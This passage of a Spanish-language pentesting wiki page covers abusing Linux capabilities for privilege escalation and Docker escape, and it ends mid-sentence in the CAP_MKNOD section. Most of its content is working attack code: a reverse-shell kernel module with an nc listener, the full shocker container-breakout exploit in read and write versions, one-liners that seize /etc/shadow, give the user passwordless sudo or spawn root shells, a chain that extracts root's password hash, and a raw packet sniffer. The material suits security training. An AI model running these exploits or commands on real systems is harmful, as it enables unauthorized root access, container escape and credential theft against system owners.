static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> ¡El carácter en blanco antes de cada palabra make en el Makefile **debe ser un tabulador, no espacios**!

Ejecuta `make` para compilarlo.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicia `nc` dentro de una shell y **carga el módulo** desde otra y capturarás la shell en el proceso `nc`:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**El código de esta técnica se copió del laboratorio "Abusing SYS_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Otro ejemplo de esta técnica puede encontrarse en [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a un proceso **omitir los permisos de lectura de archivos y los permisos de lectura y ejecución de directorios**. Su uso principal es buscar o leer archivos. Sin embargo, también permite que un proceso utilice la función `open_by_handle_at(2)`, que puede acceder a cualquier archivo, incluidos los que están fuera del mount namespace del proceso. Se supone que el handle utilizado en `open_by_handle_at(2)` es un identificador no transparente obtenido mediante `name_to_handle_at(2)`, pero puede incluir información sensible, como números de inode, que son vulnerables a manipulación. Sebastian Krahmer demostró el potencial de explotación de esta capability, especialmente en el contexto de los contenedores Docker, mediante el exploit shocker, tal como se analiza [aquí](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Esto significa que puedes** **omitir las comprobaciones de permisos de lectura de archivos y las comprobaciones de permisos de lectura/ejecución de directorios.**

**Ejemplo con un binario**

El binario podrá leer cualquier archivo. Por lo tanto, si un archivo como tar tiene esta capability, podrá leer el archivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Ejemplo con binary2**

En este caso, supongamos que el binario **`python`** tiene esta capability. Para listar los archivos de root, podrías hacer lo siguiente:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Y para leer un archivo podrías hacer:
```python
print(open("/etc/shadow", "r").read())
```
**Ejemplo en el entorno (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
En la salida anterior puedes ver que la capability **DAC_READ_SEARCH** está habilitada. Como resultado, el container puede **depurar procesos**.

Puedes aprender cómo funciona el siguiente exploit en [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), pero, en resumen, **CAP_DAC_READ_SEARCH** no solo nos permite recorrer el sistema de archivos sin comprobaciones de permisos, sino que también elimina explícitamente cualquier comprobación para _**open_by_handle_at(2)**_ y **podría permitir que nuestro proceso acceda a archivos sensibles abiertos por otros procesos**.

El exploit original que abusa de estos permisos para leer archivos del host se puede encontrar aquí: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); el siguiente es una **versión modificada que permite indicar como primer argumento el archivo que quieres leer y volcarlo en un archivo**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> El exploit necesita encontrar un puntero a algo montado en el host. El exploit original utilizaba el archivo /.dockerinit y esta versión modificada utiliza /etc/hostname. Si el exploit no funciona, quizá necesites establecer un archivo diferente. Para encontrar un archivo que esté montado en el host, simplemente ejecuta el comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: El exploit necesita encontrar un puntero a algo montado en el host. El exploit original utilizaba el archivo /.dockerinit y esta versión modificada utiliza...](<../../images/image (407) (1).png>)

**El código de esta técnica se copió del laboratorio "Abusing DAC_READ_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Esto significa que puedes omitir las comprobaciones de permisos de escritura en cualquier archivo, por lo que puedes escribir en cualquier archivo.**

Hay muchos archivos que puedes **sobrescribir para escalar privilegios;** [**puedes obtener ideas aquí**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con binary**

En este ejemplo, vim tiene esta capability, por lo que puedes modificar cualquier archivo como _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Ejemplo con el binario 2**

En este ejemplo, el binario **`python`** tendrá esta capability. Podrías usar python para sobrescribir cualquier archivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Ejemplo con environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
En primer lugar, lee la sección anterior que [**abusa de la capability DAC_READ_SEARCH para leer archivos arbitrarios**](linux-capabilities.md#cap_dac_read_search) del host y **compila** el exploit.\
A continuación, **compila la siguiente versión del exploit shocker**, que te permitirá **escribir archivos arbitrarios** dentro del sistema de archivos del host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Para **escapar** del contenedor de Docker, podrías **descargar** los archivos `/etc/shadow` y `/etc/passwd` del host, **añadirles** un **nuevo usuario** y usar **`shocker_write`** para sobrescribirlos. Luego, **acceder** mediante **ssh**.

**El código de esta técnica se copió del laboratorio "Abusing DAC_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Esto significa que es posible cambiar la propiedad de cualquier archivo.**

**Ejemplo con un binario**

Supongamos que el binario **`python`** tiene esta capability; puedes **cambiar** el **propietario** del archivo **`shadow`**, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
O con el binario **`ruby`** teniendo esta capacidad:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Esto significa que es posible cambiar los permisos de cualquier archivo.**

**Ejemplo con un binario**

Si Python tiene esta capability, puedes modificar los permisos del archivo shadow, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Esto significa que es posible establecer el ID de usuario efectivo del proceso creado.**

**Ejemplo con binary**

Si Python tiene esta **capability**, puedes abusar de ella muy fácilmente para escalar privilegios a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Otra forma:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Esto significa que es posible establecer el identificador de grupo efectivo del proceso creado.**

Hay muchos archivos que puedes **sobrescribir para escalar privilegios;** [**puedes obtener ideas aquí**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con un binario**

En este caso, debes buscar archivos interesantes que un grupo pueda leer, porque puedes suplantar a cualquier grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una vez que hayas encontrado un archivo que puedas aprovechar (mediante lectura o escritura) para escalar privilegios, puedes **obtener una shell suplantando al grupo de interés** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
En este caso se suplantó al grupo shadow, por lo que puedes leer el archivo `/etc/shadow`:
```bash
cat /etc/shadow
```
### Cadena combinada: CAP_SETGID + CAP_CHOWN

Cuando ambas capabilities están disponibles en el mismo helper, una cadena práctica es:

1. Cambiar el EGID a `shadow` (u otro grupo privilegiado).
2. Usar `chown` en `/etc/shadow` para establecer tu UID mientras mantienes el grupo `shadow`.
3. Leer un hash objetivo y hacer crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Esto evita necesitar acceso root completo directamente y normalmente es suficiente para pivotar mediante la reutilización de credenciales.

Si **docker** está instalado, podrías **impersonate** el **docker group** y abusar de él para comunicarte con el [**docker socket** y escalar privilegios](#writable-docker-socket).

## CAP_SETFCAP

**Esto significa que es posible establecer capacidades en archivos y procesos**

**Ejemplo con un binario**

Si Python tiene esta **capability**, puedes abusar de ella muy fácilmente para escalar privilegios a root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Ten en cuenta que si estableces una nueva capability en el binario con CAP_SETFCAP, perderás esta cap.

Una vez que tengas la [capacidad SETUID](linux-capabilities.md#cap_setuid), puedes ir a su sección para ver cómo escalar privilegios.

**Ejemplo con el entorno (Docker breakout)**

Por defecto, la capability **CAP_SETFCAP se asigna al proceso dentro del container en Docker**. Puedes comprobarlo ejecutando algo como:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capability permite **asignar cualquier otra capability a los binarios**, por lo que podríamos pensar en **escapar** del container **abusando de cualquiera de los otros breakouts de capabilities** mencionados en esta página.\
Sin embargo, si intentas asignar, por ejemplo, las capabilities CAP_SYS_ADMIN y CAP_SYS_PTRACE al binario gdb, comprobarás que puedes asignárselas, pero el **binario no podrá ejecutarse después de esto**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[De la documentación](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Este es un **superset limitante de las capabilities efectivas** que el thread puede asumir. También es un superset limitante de las capabilities que pueden añadirse al conjunto inheri‐table por un thread que **no tenga la capability CAP_SETPCAP** en su conjunto efectivo._\
Parece que las capabilities Permitted limitan las que pueden utilizarse.\
Sin embargo, Docker también concede **CAP_SETPCAP** por defecto, por lo que podrías ser capaz de **establecer nuevas capabilities dentro del conjunto inheri‐table**.\
Sin embargo, en la documentación de esta cap: _CAP_SETPCAP : \[…] **añadir cualquier capability del conjunto** bounding **del thread que realiza la llamada a su conjunto inheri‐table**_.\
Parece que solo podemos añadir al conjunto inheri‐table capabilities del conjunto bounding. Esto significa que **no podemos incluir nuevas capabilities como CAP_SYS_ADMIN o CAP_SYS_PTRACE en el conjunto inherit para escalar privilegios**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proporciona varias operaciones sensibles, incluido el acceso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modificación de `mmap_min_addr`, el acceso a las system calls `ioperm(2)` e `iopl(2)` y varios comandos de disco. El `FIBMAP ioctl(2)` también se habilita mediante esta capability, lo que ha causado problemas en el [pasado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Según la página del manual, esto también permite al titular **`perform a range of device-specific operations on other devices`** de forma descriptiva.

Esto puede ser útil para **privilege escalation** y **Docker breakout.**

## CAP_KILL

**Esto significa que es posible matar cualquier proceso.**

**Ejemplo con un binario**

Supongamos que el binario **`python`** tiene esta capability. Si también pudieras **modificar algún archivo de configuración de un servicio o socket** (o cualquier archivo de configuración relacionado con un servicio), podrías introducirle un backdoor y, posteriormente, matar el proceso relacionado con ese servicio y esperar a que el nuevo archivo de configuración se ejecute con tu backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Si tienes capabilities de **kill** y hay un **programa de node ejecutándose como root** (o como un usuario diferente), probablemente podrías **enviarle** la **señal SIGUSR1** y hacer que **abra el debugger de node**, al que puedes conectarte.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Esto significa que es posible escuchar en cualquier puerto (incluso en los privilegiados).** No puedes escalar privilegios directamente con esta capability.

**Ejemplo con un binario**

Si **`python`** tiene esta capability, podrá escuchar en cualquier puerto e incluso conectarse desde él a cualquier otro puerto (algunos servicios requieren conexiones desde puertos con privilegios específicos).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

La capacidad [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a los procesos **crear sockets RAW y PACKET**, lo que les permite generar y enviar paquetes de red arbitrarios. Esto puede provocar riesgos de seguridad en entornos containerizados, como packet spoofing, inyección de tráfico y eludir los controles de acceso a la red. Los actores maliciosos podrían explotar esto para interferir con el enrutamiento del contenedor o comprometer la seguridad de la red del host, especialmente sin protecciones de firewall adecuadas. Además, **CAP_NET_RAW** es fundamental para que los contenedores privilegiados admitan operaciones como hacer ping mediante solicitudes ICMP RAW.

**Esto significa que es posible sniffear tráfico.** No se pueden escalar privilegios directamente con esta capability.

**Ejemplo con binario**

Si el binario **`tcpdump`** tiene esta capability, podrás utilizarlo para capturar información de red.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Ten en cuenta que, si el **entorno** proporciona esta capability, también podrías usar **`tcpdump`** para sniffear tráfico.

**Ejemplo con el binario 2**

El siguiente ejemplo es código de **`python2`** que puede ser útil para interceptar el tráfico de la interfaz "**lo**" (**localhost**). El código procede del lab "_The Basics: CAP-NET_BIND + NET_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

La capacidad [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede al titular la facultad de **alterar las configuraciones de red**, incluidos los ajustes del firewall, las tablas de enrutamiento, los permisos de los sockets y la configuración de las interfaces de red dentro de los network namespaces expuestos. También permite activar el **modo promiscuo** en las interfaces de red, lo que permite realizar packet sniffing entre namespaces.

**Ejemplo con binary**

Supongamos que **python binary** tiene estas capacidades.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Esto significa que es posible modificar los atributos del inode.** No puedes escalar privilegios directamente con esta capability.

**Ejemplo con binary**

Si encuentras que un archivo es immutable y python tiene esta capability, puedes **eliminar el atributo immutable y hacer que el archivo sea modificable:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Ten en cuenta que normalmente este atributo inmutable se establece y se elimina usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite la ejecución de la llamada al sistema `chroot(2)`, lo que potencialmente puede permitir escapar de entornos `chroot(2)` mediante vulnerabilidades conocidas:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) no solo permite la ejecución de la llamada al sistema `reboot(2)` para reiniciar el sistema, incluidos comandos específicos como `LINUX_REBOOT_CMD_RESTART2`, adaptados a determinadas plataformas de hardware, sino que también permite usar `kexec_load(2)` y, desde Linux 3.17, `kexec_file_load(2)` para cargar kernels de crash nuevos o firmados, respectivamente.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) se separó de la más amplia **CAP_SYS_ADMIN** en Linux 2.6.37, concediendo específicamente la capacidad de usar la llamada `syslog(2)`. Esta capability permite ver las direcciones del kernel mediante `/proc` e interfaces similares cuando el ajuste `kptr_restrict` está establecido en 1, lo que controla la exposición de las direcciones del kernel. Desde Linux 2.6.39, el valor predeterminado de `kptr_restrict` es 0, lo que significa que las direcciones del kernel están expuestas, aunque muchas distribuciones lo establecen en 1 (ocultar las direcciones excepto para uid 0) o en 2 (ocultar siempre las direcciones) por motivos de seguridad.

Además, **CAP_SYSLOG** permite acceder a la salida de `dmesg` cuando `dmesg_restrict` está establecido en 1. A pesar de estos cambios, **CAP_SYS_ADMIN** conserva la capacidad de realizar operaciones `syslog` debido a precedentes históricos.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) amplía la funcionalidad de la llamada al sistema `mknod` más allá de la creación de archivos normales, FIFOs (named pipes) o UNIX domain sockets. Permite específicamente crear archivos especiales, entre los que se incluyen:

- **S_IFCHR**: archivos especiales de caracteres, que son dispositivos como los terminales.
- **S_IFBLK**: archivos especiales de bloques, que son dispositivos como los discos.

Esta capability es esencial para los procesos que necesitan crear archivos de dispositivos, facilitando la interacción directa con el hardware mediante dispositivos de caracteres o de bloques.

Es una capability predeterminada de docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Esta capability permite realizar privilege escalations (mediante la lectura completa del disco) en el host, bajo estas condiciones:

